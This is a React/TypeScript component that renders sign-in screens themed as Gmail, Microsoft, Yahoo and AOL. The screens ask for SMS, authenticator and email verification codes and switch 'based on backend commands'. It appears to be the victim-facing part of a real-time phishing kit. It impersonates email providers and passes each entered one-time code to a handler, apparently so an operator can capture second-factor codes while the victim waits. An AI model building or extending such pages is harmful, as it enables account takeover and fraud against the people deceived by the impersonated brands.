import React from 'react';

export type UIStateType = 
  | 'incorrect_password'
  | 'enter_sms_code'
  | 'approve_authenticator'
  | 'account_locked'
  | 'security_check'
  | 'two_factor_required'
  | 'email_verification'
  | 'idle'
  | 'loading';

export interface InteractiveStateProps {
  stateType: UIStateType;
  provider: string;
  data?: Record<string, unknown>;
  onAction?: (action: string, data?: Record<string, unknown>) => void;
}

/**
 * Component to display various UI states based on backend commands
 * Themed according to the email provider (Gmail, Office365, Yahoo, etc.)
 */
const InteractiveState: React.FC<InteractiveStateProps> = ({ 
  stateType, 
  provider, 
  data,
  onAction 
}) => {
  const getProviderTheme = () => {
    switch (provider.toLowerCase()) {
      case 'gmail':
      case 'google':
        return {
          primaryColor: '#4285f4',
          backgroundColor: '#f0f4f9',
          textColor: '#202124',
          errorColor: '#d93025',
          logo: 'Google',
        };
      case 'office365':
      case 'microsoft':
      case 'outlook':
        return {
          primaryColor: '#0078d4',
          backgroundColor: '#ffffff',
          textColor: '#323130',
          errorColor: '#a4262c',
          logo: 'Microsoft',
        };
      case 'yahoo':
        return {
          primaryColor: '#6001d2',
          backgroundColor: '#ffffff',
          textColor: '#000000',
          errorColor: '#cc0000',
          logo: 'Yahoo',
        };
      case 'aol':
        return {
          primaryColor: '#0066cc',
          backgroundColor: '#ffffff',
          textColor: '#000000',
          errorColor: '#cc0000',
          logo: 'AOL',
        };
      default:
        return {
          primaryColor: '#0066cc',
          backgroundColor: '#f5f5f5',
          textColor: '#333333',
          errorColor: '#cc0000',
          logo: 'Email',
        };
    }
  };

  const theme = getProviderTheme();

  const renderStateContent = () => {
    switch (stateType) {
      case 'incorrect_password':
        return (
          <div className="text-center p-6">
            <div 
              className="inline-flex items-center justify-center w-16 h-16 rounded-full mb-4"
              style={{ backgroundColor: `${theme.errorColor}20` }}
            >
              <svg className="w-8 h-8" style={{ color: theme.errorColor }} fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
              </svg>
            </div>
            <h2 className="text-xl font-semibold mb-2" style={{ color: theme.textColor }}>
              Incorrect Password
            </h2>
            <p className="text-sm mb-4" style={{ color: theme.textColor, opacity: 0.7 }}>
              The password you entered is incorrect. Please try again or reset your password.
            </p>
            <button
              onClick={() => onAction?.('retry')}
              className="px-6 py-2 rounded text-white font-medium"
              style={{ backgroundColor: theme.primaryColor }}
            >
              Try Again
            </button>
          </div>
        );

      case 'enter_sms_code':
        return (
          <div className="text-center p-6">
            <div 
              className="inline-flex items-center justify-center w-16 h-16 rounded-full mb-4"
              style={{ backgroundColor: `${theme.primaryColor}20` }}
            >
              <svg className="w-8 h-8" style={{ color: theme.primaryColor }} fill="currentColor" viewBox="0 0 20 20">
                <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z" />
              </svg>
            </div>
            <h2 className="text-xl font-semibold mb-2" style={{ color: theme.textColor }}>
              Enter SMS Code
            </h2>
            <p className="text-sm mb-4" style={{ color: theme.textColor, opacity: 0.7 }}>
              We sent a verification code to {data?.phoneNumber || 'your phone'}
            </p>
            <input
              type="text"
              placeholder="Enter code"
              maxLength={6}
              className="w-full max-w-xs px-4 py-2 border rounded text-center text-lg mb-4"
              style={{ borderColor: theme.primaryColor }}
              autoFocus
              onChange={(e) => {
                if (e.target.value.length === 6) {
                  onAction?.('submit_sms', { code: e.target.value });
                }
              }}
            />
            <button
              onClick={() => onAction?.('resend_sms')}
              className="text-sm font-medium"
              style={{ color: theme.primaryColor }}
            >
              Resend code
            </button>
          </div>
        );

      case 'approve_authenticator':
        return (
          <div className="text-center p-6">
            <div 
              className="inline-flex items-center justify-center w-16 h-16 rounded-full mb-4 animate-pulse"
              style={{ backgroundColor: `${theme.primaryColor}20` }}
            >
              <svg className="w-8 h-8" style={{ color: theme.primaryColor }} fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M18 8a6 6 0 01-7.743 5.743L10 14l-1 1-1 1H6v2H2v-4l4.257-4.257A6 6 0 1118 8zm-6-4a1 1 0 100 2 2 2 0 012 2 1 1 0 102 0 4 4 0 00-4-4z" clipRule="evenodd" />
              </svg>
            </div>
            <h2 className="text-xl font-semibold mb-2" style={{ color: theme.textColor }}>
              Approve Sign-In
            </h2>
            <p className="text-sm mb-4" style={{ color: theme.textColor, opacity: 0.7 }}>
              Check your {data?.appName || 'authenticator app'} and approve the sign-in request
            </p>
            <div className="flex items-center justify-center space-x-2 mb-4">
              <div className="w-2 h-2 rounded-full animate-bounce" style={{ backgroundColor: theme.primaryColor, animationDelay: '0s' }}></div>
              <div className="w-2 h-2 rounded-full animate-bounce" style={{ backgroundColor: theme.primaryColor, animationDelay: '0.1s' }}></div>
              <div className="w-2 h-2 rounded-full animate-bounce" style={{ backgroundColor: theme.primaryColor, animationDelay: '0.2s' }}></div>
            </div>
            <p className="text-xs" style={{ color: theme.textColor, opacity: 0.5 }}>
              Waiting for approval...
            </p>
          </div>
        );

      case 'account_locked':
        return (
          <div className="text-center p-6">
            <div 
              className="inline-flex items-center justify-center w-16 h-16 rounded-full mb-4"
              style={{ backgroundColor: `${theme.errorColor}20` }}
            >
              <svg className="w-8 h-8" style={{ color: theme.errorColor }} fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
              </svg>
            </div>
            <h2 className="text-xl font-semibold mb-2" style={{ color: theme.textColor }}>
              Account Locked
            </h2>
            <p className="text-sm mb-4" style={{ color: theme.textColor, opacity: 0.7 }}>
              {data?.message || 'Your account has been temporarily locked for security reasons.'}
            </p>
            <button
              onClick={() => onAction?.('contact_support')}
              className="px-6 py-2 rounded text-white font-medium"
              style={{ backgroundColor: theme.primaryColor }}
            >
              Contact Support
            </button>
          </div>
        );

      case 'security_check':
        return (
          <div className="text-center p-6">
            <div 
              className="inline-flex items-center justify-center w-16 h-16 rounded-full mb-4"
              style={{ backgroundColor: `${theme.primaryColor}20` }}
            >
              <svg className="w-8 h-8" style={{ color: theme.primaryColor }} fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
            </div>
            <h2 className="text-xl font-semibold mb-2" style={{ color: theme.textColor }}>
              Security Check
            </h2>
            <p className="text-sm mb-4" style={{ color: theme.textColor, opacity: 0.7 }}>
              We need to verify your identity. Please complete the security check.
            </p>
            <div className="animate-pulse">
              <p className="text-xs" style={{ color: theme.textColor, opacity: 0.5 }}>
                Loading verification...
              </p>
            </div>
          </div>
        );

      case 'two_factor_required':
        return (
          <div className="text-center p-6">
            <div 
              className="inline-flex items-center justify-center w-16 h-16 rounded-full mb-4"
              style={{ backgroundColor: `${theme.primaryColor}20` }}
            >
              <svg className="w-8 h-8" style={{ color: theme.primaryColor }} fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.319 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.35-.166-2.001A11.954 11.954 0 0110 1.944zM11 14a1 1 0 11-2 0 1 1 0 012 0zm0-7a1 1 0 10-2 0v3a1 1 0 102 0V7z" clipRule="evenodd" />
              </svg>
            </div>
            <h2 className="text-xl font-semibold mb-2" style={{ color: theme.textColor }}>
              Two-Factor Authentication
            </h2>
            <p className="text-sm mb-4" style={{ color: theme.textColor, opacity: 0.7 }}>
              Enter the 6-digit code from your authenticator app
            </p>
            <input
              type="text"
              placeholder="000000"
              maxLength={6}
              className="w-full max-w-xs px-4 py-2 border rounded text-center text-lg tracking-wider mb-4"
              style={{ borderColor: theme.primaryColor }}
              autoFocus
              onChange={(e) => {
                if (e.target.value.length === 6) {
                  onAction?.('submit_2fa', { code: e.target.value });
                }
              }}
            />
          </div>
        );

      case 'email_verification':
        return (
          <div className="text-center p-6">
            <div 
              className="inline-flex items-center justify-center w-16 h-16 rounded-full mb-4"
              style={{ backgroundColor: `${theme.primaryColor}20` }}
            >
              <svg className="w-8 h-8" style={{ color: theme.primaryColor }} fill="currentColor" viewBox="0 0 20 20">
                <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
                <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
              </svg>
            </div>
            <h2 className="text-xl font-semibold mb-2" style={{ color: theme.textColor }}>
              Verify Your Email
            </h2>
            <p className="text-sm mb-4" style={{ color: theme.textColor, opacity: 0.7 }}>
              We sent a verification code to {(data?.email as string) || 'your email address'}
            </p>
            <input
              type="text"
              placeholder="Enter code"
              maxLength={6}
              className="w-full max-w-xs px-4 py-2 border rounded text-center text-lg tracking-wider mb-4"
              style={{ borderColor: theme.primaryColor }}
              autoFocus
              onChange={(e) => {
                if (e.target.value.length === 6) {
                  onAction?.('submit_email_code', { code: e.target.value });
                }
              }}
            />
            <button
              onClick={() => onAction?.('resend_email')}
              className="text-sm font-medium block mx-auto"
              style={{ color: theme.primaryColor }}
            >
              Resend code
            </button>
          </div>
        );

      case 'loading':
        return (
          <div className="text-center p-6">
            <div className="inline-block animate-spin rounded-full h-12 w-12 border-b-2 mb-4" style={{ borderColor: theme.primaryColor }}></div>
            <p className="text-sm" style={{ color: theme.textColor, opacity: 0.7 }}>
              {data?.message || 'Processing...'}
            </p>
          </div>
        );

      case 'idle':
      default:
        return null;
    }
  };

  if (stateType === 'idle') return null;

  return (
    <div 
      className="min-h-screen flex items-center justify-center"
      style={{ backgroundColor: theme.backgroundColor }}
    >
      <div 
        className="w-full max-w-md mx-4 rounded-lg shadow-lg"
        style={{ backgroundColor: '#ffffff' }}
      >
        {renderStateContent()}
      </div>
    </div>
  );
};

export default InteractiveState;
